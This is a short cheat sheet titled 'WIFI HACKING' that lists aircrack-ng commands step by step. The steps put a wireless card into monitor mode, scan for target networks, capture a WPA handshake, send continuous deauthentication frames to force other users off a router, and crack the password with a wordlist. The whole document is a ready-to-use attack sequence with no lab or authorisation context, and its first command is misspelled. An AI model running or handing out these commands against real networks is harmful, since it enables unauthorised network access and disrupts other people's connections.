# WIFI HACKING

# KILL ALL THE NETWORKS
aimon-ng check kill

# TURN WIFI INTO MONITOR MODE
airmon-ng start $WIFI_INTERFACE_NAME

# CHECK BSSID AND CHANNEL NUMBER OF NETWORKS
airodump-ng "${WIFI_INTERFACE_NAME}mon"

# CAPTURE HANDSHAKE
airodump-ng "${WIFI_INTERFACE_NAME}mon" --bssid $INTERFACE_BSSID -c $INTERFACE_CHANNEL_NUMBER -w $HANDSHAKE_FILE_NAME

# DEAUTHENTICATE OTHER USER TO CAPTURE HANDSHAKE
aireplay-ng "${WIFI_INTERFACE_NAME}mon" --deauth 0 -a $BSSID_OF_ROUTER -c $BSSID_OF_CLIENT

# CRACK PASSWORD WITH DICTIONARY
aircrack-ng -w $WORDLIST "${HANDSHAKE_FILE_NAME}-01.cap"
